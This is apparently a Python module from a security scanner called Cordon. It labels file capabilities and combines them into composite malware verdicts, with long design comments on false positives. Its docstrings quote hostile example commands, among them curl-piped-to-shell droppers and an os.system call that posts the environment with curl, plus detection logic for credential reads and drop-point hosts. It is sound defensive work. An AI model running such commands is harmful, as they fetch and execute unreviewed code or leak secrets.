"""Capability detection and composite reasoning.

This is where the language-agnostic detection model becomes real.

The detector does two distinct jobs, and separating them is the whole design.

**Labelling.** It runs the capability rules over a file's bytes and records what
that file can do: decode, execute, spawn, read credentials, reach the network,
persist. On their own these are observations, not accusations. Every one has
legitimate uses, and reporting them individually would drown a user in noise.

**Reasoning.** It then evaluates composite rules over those labels. A file that
decodes a string *and* executes it is a second-stage loader. A file that reads
credentials *and* reaches the network *and* spawns a process is an exfiltrator.
Neither conclusion is available from any single pattern, which is why signature
matching alone plateaus so quickly.

The reason this generalises across languages is that the primitives are forced
by the attacker's objective rather than chosen by them. To exfiltrate data, code
must read something sensitive and send it somewhere. To run a second stage, it
must decode a payload and execute it. Those constraints hold in every language,
so a new language supplies pattern data for six names and inherits the entire
composite rule set unchanged.
"""

from __future__ import annotations

import re
from collections import Counter
from contextlib import suppress
from dataclasses import dataclass
from typing import TYPE_CHECKING

from cordon_scanner.core.models import (
    Capability,
    Category,
    Explanation,
    Finding,
    Location,
    MatchKind,
    Severity,
)
from cordon_scanner.core.redact import Redactor
from cordon_scanner.core.scoring import RiskScorer, ScoringContext
from cordon_scanner.detect import embedded
from cordon_scanner.detect.base import (
    BaseDetector,
    DetectorRequirements,
    FileUnit,
    RuleSelector,
    ScanContext,
)
from cordon_scanner.detect.secrets import (
    FIXTURE_CEILING,
    is_build_tooling,
    is_documentation,
    is_generated_artefact,
    is_test_material,
)

if TYPE_CHECKING:
    from collections.abc import Iterable

    from cordon_scanner.core.content import FileContent
    from cordon_scanner.detect.base import Unit
    from cordon_scanner.detect.embedded import Command
    from cordon_scanner.rules.loader import CompiledRule


MAX_VARIANTS = 8
"""Distinct operations counted per rule before the count stops mattering.

Depth beyond a handful changes no conclusion, and the cap is what keeps a
generated file with a thousand matches from being scanned in full."""

MAX_MATCHES_EXAMINED = 64
"""Occurrences examined per rule while counting distinct operations."""


@dataclass(frozen=True, slots=True)
class CapabilityHit:
    """One capability observed in a file, with where it was seen."""

    capability: Capability
    rule_id: str
    byte_start: int
    byte_end: int
    line: int
    variants: int = 1
    """How many distinct operations of this capability the rule matched.

    A decode rule covering base64, hex and decompression matches all three
    with one pattern, so the number of rules that fired cannot express how many
    decoding steps a file performs. This can: one call site repeated ten times
    is still one operation, and base64 followed by decompression is two."""


class CapabilityDetector(BaseDetector):
    """Labels files with capabilities and evaluates composite rules over them."""

    id = "capability"
    version = "0.1.0"
    categories = frozenset(
        {Category.SUSPICIOUS, Category.MALICIOUS, Category.POLICY, Category.OPERATIONAL}
    )
    requires = DetectorRequirements(content=True)

    def applicable(self, ctx: ScanContext) -> bool:
        """Runs whenever any capability or composite rule is loaded."""
        return any(
            r.rule.capability is not None or r.match.kind is MatchKind.COMPOSITE for r in ctx.rules
        )

    def inspect(self, unit: Unit, ctx: ScanContext) -> Iterable[Finding]:
        if not isinstance(unit, FileUnit):
            return ()

        content = unit.content

        # Binary files are excluded from content rules. A byte sequence in a PNG
        # that happens to spell a pattern is a false positive with no upside,
        # and the file was never source to begin with.
        if content.is_binary:
            return ()

        candidates = RuleSelector.select_rules(ctx.rules, language=unit.language, path=content.path)
        if not candidates:
            return ()

        hits = self._match_capabilities(content, candidates)
        resolved, commands = self._resolved_capabilities(unit, content)
        if not commands and unit.language != "python":
            commands = embedded.extract(content.text, unit.language)
        hits.extend(resolved)
        hits.extend(self._embedded_capabilities(ctx, content, commands))
        hits.extend(self._destination_capabilities(content))
        findings: list[Finding] = list(self._composite_findings(unit, ctx, hits, candidates))

        # A truncated file was only partly examined, so say so. Claiming a clean
        # result for content that was never read is the failure this project
        # treats as unacceptable.
        if content.truncated:
            findings.append(
                self.operational(
                    path=content.path,
                    message=(
                        f"Only the first {len(content.raw)} bytes of this "
                        f"{content.size}-byte file were examined."
                    ),
                    detail="max_file_bytes",
                    rule_id="OPERATIONAL.FILE.TRUNCATED",
                )
            )

        return findings

    # -- Labelling -------------------------------------------------------

    def _match_capabilities(
        self, content: FileContent, candidates: tuple[CompiledRule, ...]
    ) -> list[CapabilityHit]:
        """Run capability rules over the file's bytes.

        Matching happens against ``bytes``, never decoded text. Most files match
        nothing, and decoding them all would be the single largest waste in the
        scan. It also means attacker-controlled bytes are only decoded once
        something has already indicated it is worth doing.
        """
        raw = content.raw
        hits: list[CapabilityHit] = []

        for compiled in candidates:
            capability = compiled.rule.capability
            if capability is None or compiled.match.regex is None:
                continue

            # The prefilter is what makes this affordable. A cheap substring scan
            # rejects the large majority of files before any regex runs, turning
            # cost proportional to files times rules into something a commit-time
            # hook can pay.
            prefilter = compiled.match.prefilter
            if prefilter and not any(literal in raw for literal in prefilter):
                continue

            first = None
            distinct: set[bytes] = set()

            for index, match in enumerate(compiled.match.regex.finditer(raw)):
                if CapabilityDetector._is_printed_text(content, match.start(), match.end()):
                    continue
                if first is None:
                    first = match
                # Distinct *operations*, not distinct occurrences. Ten calls to
                # the same decoder are one decoding step repeated; base64 and
                # then decompression are two, and that difference is what
                # separates an ordinary decode from a chain built to survive
                # each layer of inspection.
                distinct.add(b" ".join(match.group(0).split()))
                if len(distinct) >= MAX_VARIANTS or index >= MAX_MATCHES_EXAMINED:
                    break

            if first is None:
                continue

            # One hit per rule per file. Reporting every occurrence would
            # inflate the evidence without changing any conclusion; the count
            # of distinct operations rides along on the hit instead.
            hits.append(
                CapabilityHit(
                    capability=capability,
                    rule_id=compiled.id,
                    byte_start=first.start(),
                    byte_end=first.end(),
                    line=content.line_of(first.start()),
                    variants=len(distinct),
                )
            )

        return hits

    #: A line this long means the file was generated, whatever it is called.
    #:
    #: The path globs catch `*.min.js`, `dist/` and `.yarn/releases/`, and they cannot
    #: catch a bundler that names its output with a content hash:
    #: `assets/ToolsPage-COpoWLDm.js` and `assets/index-BTLZFAP9.js` are Vite output and
    #: match no convention a glob can express. A minified bundle contains a decoder
    #: beside an evaluator because that is what a module loader is, so it supplies
    #: `SUSPECT.DECODE_CHAIN.001` and `SUSPECT.DECODE_EXEC.001` by construction.
    #:
    #: Content rather than name is also the harder signal to dodge, which is why the
    #: threshold is generous: a thousand characters on one line is not something
    #: anybody writes by hand, and hand-written code that does is already reported by
    #: `SUSPECT.OBFUSCATION.LONGLINE.001` on its own merits.
    MINIFIED_LINE = 1000

    @staticmethod
    def _is_minified(content: FileContent) -> bool:
        """Whether this file looks like build output regardless of its name."""
        return content.longest_line > CapabilityDetector.MINIFIED_LINE

    @staticmethod
    def _satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
        """The bytes the composite actually matched across, plus a margin.

        A window around the ANCHOR is the wrong region to look in. The anchor is one
        of several hits and not necessarily the fetch: in Elasticsearch's
        `setup_node.sh` the anchor landed 400 bytes away from the `curl`, so the pin in
        the URL was outside the window and the file was still called malware.

        The composite matched because a SET of hits sat close enough together, so that
        set is the region any statement about the match has to be made over.
        """
        if not hits:
            return b""
        start = min(hit.byte_start for hit in hits)
        end = max(hit.byte_end for hit in hits)
        return content.raw[max(0, start - 200) : end + 200]

    #: A fetch whose target is identified by something immutable.
    #:
    #: A version in the path, a release asset under a tag, a commit digest, or a
    #: checksum verified nearby. Any of those means the bytes that arrive are the bytes
    #: somebody chose, so the fetch is reviewable even though it crosses the network.
    #:
    #: What this separates, and why it is worth a category rather than a severity: the
    #: Codecov bash uploader was `curl -s https://codecov.io/bash | bash` -- no version,
    #: nothing to verify, and whatever the host served that day is what ran. That is the
    #: attack `MALWARE.DROPPER.001` is named for. Elasticsearch's
    #: `.buildkite/scripts/setup_node.sh` runs
    #: `curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash`,
    #: which is the same four shell tokens and a completely different proposition.
    #:
    #: Deliberately NOT "the host is well known". A popular host is not a control, and
    #: a list of trusted domains is a list somebody will add to.
    PINNED_FETCH = re.compile(
        rb"""(?ix)
        (?:
            /v?\d+\.\d+(?:\.\d+)?/          # a version as a path segment
          | /releases/download/[^/\s]+/       # a release asset under a tag
          | /archive/refs/tags/                # a tagged source archive
          | @[0-9a-f]{40}\b                   # a git commit pin
          | [?&](?:ref|sha|commit)=[0-9a-f]{7,40}\b
          | sha(?:1|256|512)sum[ \t]+(?:-c|--check)
          | gpg[^\n]{0,80}--verify
          | cosign[ \t]+verify
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    #: Statements whose quoted argument is shown to somebody, not run.
    #:
    #: Make's three diagnostic functions, and the printing commands of every shell
    #: and language that appears in a build file. A capability matched inside the
    #: string one of these is given is a capability the file TALKS ABOUT.
    DIAGNOSTIC_STATEMENT = re.compile(
        rb"""(?ix)
        ^[ \t]*
        (?:
            [@-]{0,2}[ \t]*
            (?:echo|printf|print|puts|say|warn|
               console\.(?:log|info|warn|error)|
               write-host|write-output|write-warning)
          | \$\((?:warning|info|error)\b
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    @staticmethod
    def _is_printed_text(content: FileContent, start: int, end: int) -> bool:
        """Whether this match sits inside a string that is printed rather than run.

        The worst false positive found against real code, and the clearest. The
        Makefile in `spf13/cobra` - one of the most depended-upon Go libraries in
        existence - carries this:

            ifeq (, $(shell which golangci-lint))
            $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
            endif

        That is the text printed to a developer who is missing a tool. Cordon read
        the `curl ... | sh` inside it and reported MALWARE.DROPPER.001 at CRITICAL,
        in the MALICIOUS category, plus SUSPECT.DROPPER.001 on the same line. An
        accusation of that weight against a printed help message is not a tuning
        problem; it is the finding that ends the conversation about whether to adopt
        the tool.

        Install instructions embedded in diagnostics, READMEs and `echo` lines are
        everywhere, because `curl ... | sh` is how a great deal of software
        documents its own installation.

        TWO conditions, and the second is what keeps this from becoming a hole:

        The statement must be a printer, and the match must lie ENTIRELY inside its
        quoted argument. `echo "run: curl x | sh"` has the whole construct inside
        the quotes and is text. `echo "$(curl x)" | sh` pipes into a shell, so the
        `| sh` that makes it dangerous sits OUTSIDE the quotes and is not
        suppressed. The distinction is exactly the one that matters, and it falls
        out of the quote test rather than needing a second rule.
        """
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False
        encoded = line.encode("utf-8", "surrogatepass")
        statement = CapabilityDetector.DIAGNOSTIC_STATEMENT.match(encoded)
        if not statement:
            return False

        # Both ends inside the same quoted run. `column_of` is one-based, matching
        # how a finding reports a column.
        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = CapabilityDetector._quote_depth(line, first)
        closing = CapabilityDetector._quote_depth(line, last)
        if opening is None or opening != closing:
            return False

        # Quoted is not the same as inert. A shell runs `$(...)` and backticks
        # inside DOUBLE quotes, so `echo "$(curl -s https://host/s)" | sh` really
        # does fetch and execute -- the quotes are around the output, not around
        # the command. Suppressing the egress there would have taken one half of
        # the dropper composite away from a genuine fetch-and-run.
        #
        # Single quotes are inert in every shell, so a substitution inside them is
        # literal text and stays suppressed.
        # Scanned from the end of the diagnostic statement rather than the start of
        # the line, because `$(warning ...)` opens with `$(` itself. Make's
        # `warning`, `info` and `error` are FUNCTIONS, not command substitutions --
        # only `$(shell ...)` runs anything -- so counting that paren read every
        # Make diagnostic as executing its own message, which put the cobra
        # Makefile straight back to critical.
        return not (
            opening == '"'
            and CapabilityDetector._inside_substitution(line, first, begin=statement.end())
        )

    @staticmethod
    def _inside_substitution(line: str, offset: int, *, begin: int = 0) -> bool:
        """Whether `offset` sits inside a `$(...)` or a backtick pair on this line.

        Nesting counted for `$(`, since `$(dirname $(which x))` is ordinary.
        Backticks cannot nest without escaping, so they toggle.

        `begin` skips the construct that introduced the diagnostic, which in a
        Makefile is itself spelled `$(`.
        """
        depth = 0
        backtick = False
        index = begin
        while index < min(offset, len(line)):
            if line[index] == "\\":
                index += 2
                continue
            if line.startswith("$(", index):
                depth += 1
                index += 2
                continue
            if line[index] == ")" and depth:
                depth -= 1
            elif line[index] == "`":
                backtick = not backtick
            index += 1
        return depth > 0 or backtick

    @staticmethod
    def _quote_depth(line: str, offset: int) -> str | None:
        """Which quote character encloses `offset`, or None if it is unquoted.

        Single and double quotes tracked separately, because a shell treats them
        differently and an apostrophe inside a double-quoted message -- "couldn't
        find golangci-lint" -- must not read as opening a single-quoted string.
        Escaped quotes are skipped for the same reason.
        """
        quote: str | None = None
        index = 0
        while index < min(offset, len(line)):
            character = line[index]
            if character == "\\":
                index += 2
                continue
            if quote is None and character in "\"'":
                quote = character
            elif character == quote:
                quote = None
            index += 1
        return quote

    def _resolved_capabilities(
        self, unit: FileUnit, content: FileContent
    ) -> tuple[list[CapabilityHit], list[Command]]:
        """Capabilities the patterns cannot see, resolved from the parsed tree.

        Added to the regex hits rather than replacing them. The patterns stay
        the fast path and the answer for every language this cannot parse; this
        catches what a byte pattern structurally cannot -- an aliased import, a
        bound name, a spliced string -- because those are the same primitive
        written so that no literal appears.

        Returns the commands found at spawn sites alongside the capabilities,
        since those are what the shell rules are then run against.

        Python only. `ast` is in the standard library, so this costs nothing
        against the zero-runtime-dependency constraint. JavaScript needs a
        parser that is not, which is a decision about that constraint rather
        than a line of code, and it is not taken here.
        """
        if unit.language != "python":
            return [], []

        from cordon_scanner.detect.pyast import PythonAnalyzer

        resolved = PythonAnalyzer.analyse(content.text)
        return (
            [
                CapabilityHit(
                    capability=hit.capability,
                    rule_id=f"AST.PY.{hit.capability.name}",
                    byte_start=self._span_of_line(content, hit.line)[0],
                    byte_end=self._span_of_line(content, hit.line)[1],
                    line=hit.line,
                )
                for hit in resolved
            ],
            [embedded.Command(text=hit.command, line=hit.line) for hit in resolved if hit.command],
        )

    @staticmethod
    def _span_of_line(content: FileContent, line: int) -> tuple[int, int]:
        """The byte range of a 1-based line.

        The AST tier and the embedded-shell tier report a line and no offsets,
        because neither works on byte positions -- one walks a syntax tree and
        the other matches inside an extracted string. Both used to record
        `byte_start=0, byte_end=0`, and when such a hit anchored a composite the
        report showed the first line of the file as the evidence for a finding
        located elsewhere, with a match hash taken over zero bytes: every one of
        those findings carried `sha256:e3b0c442...`, the hash of the empty
        string, under an explanation promising that "the hash identifies it".

        Converting the line back to a span costs a lookup and makes the
        evidence, the hash and the location describe the same thing.
        """
        starts = content.line_starts
        if not starts or line < 1:
            return (0, 0)
        index = min(line, len(starts)) - 1
        start = starts[index]
        end = starts[index + 1] if index + 1 < len(starts) else len(content.raw)
        return (start, max(start, end))

    DROP_POINT_RULE = "INTEL.EGRESS.DROP_POINT.001"
    """Rule id for egress to a destination that is itself informative.

    Named so composites can refer to it. It is a capability label rather than a
    finding, like the AST tier's, and it exists because the capability model
    deliberately cannot tell one outbound request from another -- posting to a
    metrics endpoint and posting to a Discord webhook are both `egress`.
    """

    @classmethod
    def _destination_capabilities(cls, content: FileContent) -> list[CapabilityHit]:
        """Egress to a destination that means something on its own.

        Webhook ingest URLs, anonymous paste and file-drop services, and
        out-of-band interaction hosts. None of these is a finding by itself --
        software does post to webhooks -- but each is a place with no reason to
        appear in a build, an install script or a library, so it raises what an
        outbound request in that file is worth.

        The host list lives in `intel/hosts.py` rather than in a pattern pack.
        A pack would have to restate it, and a restated blocklist drifts, which
        is worse than a short one because it still looks maintained.
        """
        from cordon_scanner.intel.hosts import could_match, destination_matcher

        raw = content.raw

        # A substring prefilter, for the same reason the rule engine has one:
        # the alternation over every host is around eight hundred bytes and
        # cost roughly five milliseconds per file when it ran unconditionally,
        # which was enough to put a large repository over its latency budget by
        # itself. Almost every file is rejected here without a regex running.
        if not could_match(raw):
            return []

        match = destination_matcher().search(raw)
        if match is None:
            return []

        return [
            CapabilityHit(
                capability=Capability.EGRESS,
                rule_id=cls.DROP_POINT_RULE,
                byte_start=match.start(),
                byte_end=match.end(),
                line=content.line_of(match.start()),
            )
        ]

    def _embedded_capabilities(
        self, ctx: ScanContext, content: FileContent, commands: list[Command]
    ) -> list[CapabilityHit]:
        """Shell rules, applied to shell commands written inside other languages.

        A command handed to a spawn primitive is shell, whatever the file
        extension says. Without this it is examined by the rules for the host
        language, which see a string literal, and never by the rules that know
        what the string means -- so `os.system("curl -d $(env) https://...")`
        reads as one unremarkable spawn rather than as exfiltration.

        Only the command text is matched, never the surrounding file, so this
        cannot pick up a URL from a comment or an example from a docstring. The
        hit is attributed to the line the call is on, which is where a reader
        needs to look.
        """
        if not commands:
            return []

        if content.path.endswith((".sh", ".bash", ".zsh", ".ps1")):
            # Already matched directly; running them twice would double the
            # evidence without adding anything to it.
            return []

        # Paired with their capability here so the match loop has nothing
        # optional left to unwrap.
        shell_rules = [
            (compiled, compiled.rule.capability)
            for compiled in ctx.rules.for_language("shell")
            if compiled.rule.capability is not None and compiled.match.regex is not None
        ]
        if not shell_rules:
            return []

        hits: list[CapabilityHit] = []
        seen: set[str] = set()

        for command in commands:
            payload = command.text.encode("utf-8", "surrogatepass")
            for compiled, capability in shell_rules:
                if compiled.id in seen or compiled.match.regex is None:
                    continue
                prefilter = compiled.match.prefilter
                if prefilter and not any(literal in payload for literal in prefilter):
                    continue
                if compiled.match.regex.search(payload) is None:
                    continue
                seen.add(compiled.id)
                start, end = self._span_of_line(content, command.line)
                hits.append(
                    CapabilityHit(
                        capability=capability,
                        rule_id=compiled.id,
                        byte_start=start,
                        byte_end=end,
                        line=command.line,
                    )
                )

        return hits

    # -- Reasoning -------------------------------------------------------

    def _composite_findings(
        self,
        unit: FileUnit,
        ctx: ScanContext,
        hits: list[CapabilityHit],
        candidates: tuple[CompiledRule, ...],
    ) -> Iterable[Finding]:
        if not hits:
            return

        # Depth is summed over distinct operations rather than over rules. One
        # decode rule covers base64, hex and decompression, so counting rules
        # cannot tell one decoding step from three.
        #
        # The AST tier is excluded. It is a second view of the same call --
        # resolving what a pattern could not see, not finding another decode --
        # so counting it too would make every parsed Python file appear to
        # decode twice. That reasoning lives in `_evaluate_over`, which is
        # where the counting now happens, because a composite with a proximity
        # counts what is inside its window rather than what is in the file.
        in_hook = ctx.in_install_hook(unit.path)
        in_ci = ctx.in_ci_hook(unit.path)

        for compiled in candidates:
            if compiled.match.kind is not MatchKind.COMPOSITE:
                continue
            if compiled.match.scope not in {"file", "function"}:
                continue

            window = self._satisfying_window(compiled, hits, unit.path, in_hook, in_ci)
            if window is None:
                continue

            local_by_capability = {hit.capability: hit for hit in window}
            matched = self._capabilities_of(compiled)
            anchor = self._anchor(matched, local_by_capability, window)

            finding = self._composite_finding(compiled, unit, ctx, anchor, matched, window)
            if finding is not None:
                yield finding

    MAX_PROXIMITY_HITS = 400
    """Above this many capability hits, proximity is not evaluated.

    The search is quadratic in the number of hits, and a file with four hundred
    of them is generated or enormous. Falling back to file scope there reports
    more rather than less, which is the safe direction: the alternative is a
    scan that quietly skips a rule on the largest files."""

    def _satisfying_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
    ) -> list[CapabilityHit] | None:
        """The hits that satisfy this composite, or `None` if none do.

        With no `proximity` the window is the whole file, which is what every
        composite meant before proximity existed. With one, the capabilities
        must appear within that many lines of each other -- so a claim that a
        file fetches and executes becomes a claim that one *part* of it does,
        which is what the message has always said.
        """
        proximity = compiled.match.proximity
        if proximity <= 0 or len(hits) > self.MAX_PROXIMITY_HITS:
            if self._evaluate_over(compiled, hits, path, in_hook, in_ci):
                return hits
            return None

        ordered = sorted(hits, key=lambda h: h.line)
        for index, first in enumerate(ordered):
            limit = first.line + proximity
            window = [h for h in ordered[index:] if h.line <= limit]
            if self._evaluate_over(compiled, window, path, in_hook, in_ci):
                return window
        return None

    def _evaluate_over(
        self,
        compiled: CompiledRule,
        window: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
    ) -> bool:
        present = {hit.capability for hit in window}
        counts: Counter[Capability] = Counter()
        for hit in window:
            if not hit.rule_id.startswith("AST."):
                counts[hit.capability] += hit.variants
        fired = frozenset(hit.rule_id for hit in window)
        return self._evaluate(compiled, present, path, in_hook, counts, fired, in_ci)

    def _evaluate(
        self,
        compiled: CompiledRule,
        present: set[Capability],
        path: str,
        in_hook: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
        in_ci: bool = False,
    ) -> bool:
        """Evaluate a composite expression against the capabilities present.

        Supports ``all``, ``any``, nested combinations, and ``unless``. Kept
        deliberately small: a composite rule is read by somebody deciding whether
        a security finding is justified, and an expression language rich enough
        to be clever is one nobody can review.
        """
        match = compiled.match
        counts = counts if counts is not None else Counter(present)

        if match.all_of and not all(
            self._term(
                term, present, path=path, in_hook=in_hook, in_ci=in_ci, counts=counts, fired=fired
            )
            for term in match.all_of
        ):
            return False
        if match.any_of and not any(
            self._term(
                term, present, path=path, in_hook=in_hook, in_ci=in_ci, counts=counts, fired=fired
            )
            for term in match.any_of
        ):
            return False
        return not any(
            self._term(
                term, present, path=path, in_hook=in_hook, in_ci=in_ci, counts=counts, fired=fired
            )
            for term in match.unless
        )

    def _term(
        self,
        term: object,
        present: set[Capability],
        *,
        path: str | None = None,
        in_hook: bool = False,
        in_ci: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
    ) -> bool:
        if not isinstance(term, dict):
            return False

        if "capability" in term:
            try:
                capability = Capability(str(term["capability"]))
            except ValueError:
                return False
            required = term.get("at_least")
            if required is None:
                return capability in present
            # Depth, not presence. `decode` twice in one file is a decode
            # chain -- base64 into decompress into execute -- and that is a
            # stronger claim than decoding once, because a single decode has
            # ordinary uses and stacking them has none.
            observed = (counts or Counter(present))[capability]
            return observed >= int(required)

        # A named indicator rather than a capability.
        #
        # Some evidence is not a behaviour, it is a destination: posting to a
        # Discord webhook and posting to a metrics endpoint are both `egress`,
        # and the capability model deliberately cannot tell them apart. This
        # term lets a composite say "that specific rule fired" without
        # inventing a capability for every indicator, which is what would
        # otherwise happen and would dilute the primitives until they meant
        # nothing.
        if "rule" in term:
            return str(term["rule"]) in fired

        if "any" in term:
            return any(
                self._term(
                    t, present, path=path, in_hook=in_hook, in_ci=in_ci, counts=counts, fired=fired
                )
                for t in term["any"] or ()
            )

        if "all" in term:
            return all(
                self._term(
                    t, present, path=path, in_hook=in_hook, in_ci=in_ci, counts=counts, fired=fired
                )
                for t in term["all"] or ()
            )

        if "path_glob" in term and path is not None:
            from cordon_scanner.core.walker import PathGlob

            return PathGlob.matches(path, str(term["path_glob"]))

        # Execution context as a first-class term.
        #
        # This is what lets a rule say "credential access plus network egress,
        # in an install hook" without also requiring an execution primitive. In
        # application code that pairing needs a third signal to be meaningful,
        # because reading configuration and calling an API is what an
        # application does all day. In an install hook it does not: the hook IS
        # the execution, so the pair alone is already the whole attack.
        if "context" in term:
            named = str(term["context"])
            if named == "install_hook":
                return in_hook
            if named == "ci_hook":
                return in_ci
            return False

        return False

    @staticmethod
    def _capabilities_of(compiled: CompiledRule) -> tuple[Capability, ...]:
        """Every capability named anywhere in a composite expression."""
        found: list[Capability] = []

        def walk(term: object) -> None:
            if not isinstance(term, dict):
                return
            if "capability" in term:
                with suppress(ValueError):
                    found.append(Capability(str(term["capability"])))
            for key in ("all", "any"):
                for nested in term.get(key) or ():
                    walk(nested)

        for term in (*compiled.match.all_of, *compiled.match.any_of):
            walk(term)
        return tuple(dict.fromkeys(found))

    @staticmethod
    def _anchor(
        matched: tuple[Capability, ...],
        by_capability: dict[Capability, CapabilityHit],
        hits: list[CapabilityHit],
    ) -> CapabilityHit:
        """Where to point the finding.

        The earliest hit among the capabilities the rule named. Pointing at the
        first contributing line puts the reader at the start of the construct
        rather than in the middle of it.
        """
        relevant = [by_capability[c] for c in matched if c in by_capability]
        return min(relevant or hits, key=lambda h: h.byte_start)

    def _composite_finding(
        self,
        compiled: CompiledRule,
        unit: FileUnit,
        ctx: ScanContext,
        anchor: CapabilityHit,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
    ) -> Finding | None:
        rule = compiled.rule
        content = unit.content

        mode = Redactor.effective_mode(rule.evidence_policy, ctx.config.evidence)
        evidence = Redactor.build_evidence(content, anchor.byte_start, anchor.byte_end, mode)

        present = {h.capability for h in hits}
        in_hook = ctx.in_install_hook(content.path)

        severity = RiskScorer.apply_category_floor(rule.category, rule.severity)
        category = rule.category
        escalations: list[str] = []

        # Test material and documentation get a severity ceiling, the way the secrets
        # detector has always given them one. The composites had none, so a file
        # written to demonstrate a dangerous pattern was reported as though it were
        # one in production.
        #
        # `bandit/examples/marshal_deserialize.py` is the clearest case: a file whose
        # entire purpose is to be an example of unsafe deserialisation, in a security
        # tool's `examples/` directory, reported at HIGH as decode-and-execute. It is
        # not wrong about what the file does. It is wrong about what a reader should
        # do next. The same applies to Airflow's, pydantic's and scrapy's test files,
        # which were four of nineteen findings from one rule across eighteen
        # repositories.
        #
        # A ceiling and not a suppression, and the ordering matters: the install-hook
        # escalation below is applied AFTER, so a payload in a file that happens to sit
        # under `tests/` and runs at install time still reaches CRITICAL. The ceiling
        # is about where a pattern was written, and the hook is about when it runs.
        #
        # MALICIOUS is never ceilinged. A dropper in a fixture directory is still a
        # dropper, and "we have not fixed this yet" is not a coherent position to hold
        # about evidence of intent - which is the same reasoning the baseline applies.
        # A MALICIOUS claim about a CI script needs the fetch to be opaque.
        #
        # The composite admits `ci_hook` alongside `install_hook`, correctly: a
        # compromised pipeline running what it downloaded is a real, observed attack.
        # But an install hook runs on every consumer's machine, unprompted, while a CI
        # script runs only in the pipeline the project controls -- so for CI the
        # category rests entirely on the fetch being unreviewable, and a pinned one is
        # not.
        #
        # Withdrawn rather than demoted, and the rule id is why. `MALWARE.DROPPER.001`
        # reported with `category: suspicious` is self-contradictory: the id namespace
        # encodes the category, a consumer filtering on `MALWARE.*` gets it anyway, and
        # the taxonomy derives a threat domain from the prefix. The first attempt at
        # this demoted the category and left the id, which produced exactly that.
        #
        # Nothing is lost by withdrawing it. `SUSPECT.DROPPER.001` fires on the same
        # span, at a severity the evidence supports, with remediation a maintainer can
        # act on - copy the script into the repository, or verify a digest. What stops
        # being said is "treat the host as compromised and report the package to the
        # registry", which is advice about a package somebody installed and means
        # nothing to the owner of a `.buildkite` script.
        if (
            category is Category.MALICIOUS
            and not in_hook
            and ctx.in_ci_hook(content.path)
            and CapabilityDetector.PINNED_FETCH.search(
                CapabilityDetector._satisfying_region(content, hits)
            )
        ):
            return None

        ceilinged = ""
        if category is not Category.MALICIOUS:
            if is_test_material(content.path):
                ceilinged = "test material"
            elif is_documentation(content.path):
                ceilinged = "documentation"
            elif is_build_tooling(content.path):
                ceilinged = "the project's own build and release tooling"
            elif is_generated_artefact(content.path):
                ceilinged = "generated build output"
            elif CapabilityDetector._is_minified(content):
                ceilinged = "minified output"
        if ceilinged:
            severity = min(severity, FIXTURE_CEILING)
            escalations.append(
                f"reported below its usual severity because it sits in {ceilinged}, "
                f"where a pattern like this is usually written to be read rather than run"
            )

        if in_hook:
            # This is the escalation that matters most in the whole engine. The
            # identical capability pair is ordinary in application code and is a
            # credential harvester in an install hook, because install-time code
            # runs unprompted, as the developer, with the developer's full
            # environment, before any test, review, container boundary or network
            # policy applies.
            escalations.append(
                "runs during install or build, as the user, before any other control"
            )
            severity = Severity.CRITICAL
            if (
                category is Category.SUSPICIOUS
                and {
                    Capability.CREDENTIAL,
                    Capability.EGRESS,
                }
                <= present
            ):
                category = Category.MALICIOUS
                escalations.append("reads credentials and reaches the network from an install hook")

        is_obfuscated = Capability.DECODE in present

        risk = ctx.scorer.score(
            severity,
            rule.confidence,
            ScoringContext(
                in_install_hook=in_hook,
                capabilities=frozenset(present),
                is_obfuscated=is_obfuscated,
            ),
        )

        contributing = tuple(
            f"{h.rule_id}@{h.line}"
            for h in sorted(hits, key=lambda h: h.byte_start)
            if h.capability in matched
        )

        return Finding(
            rule_id=rule.id,
            category=category,
            severity=severity,
            confidence=rule.confidence,
            message=rule.message,
            location=Location(
                path=content.path,
                line=anchor.line,
                column=content.column_of(anchor.byte_start),
                byte_start=anchor.byte_start,
                byte_end=anchor.byte_end,
                project=unit.project,
            ),
            evidence=evidence,
            remediation=rule.remediation,
            explanation=Explanation(
                summary=rule.title,
                matched_rule=rule.id,
                contributing=contributing,
                escalations=tuple(escalations),
            ),
            risk=risk,
            detector=self.id,
            rule_version=rule.version,
            rulepack=rule.rulepack,
            references=rule.references,
            capabilities=tuple(sorted(matched, key=lambda c: c.value)),
        )


__all__ = ["CapabilityDetector", "CapabilityHit"]
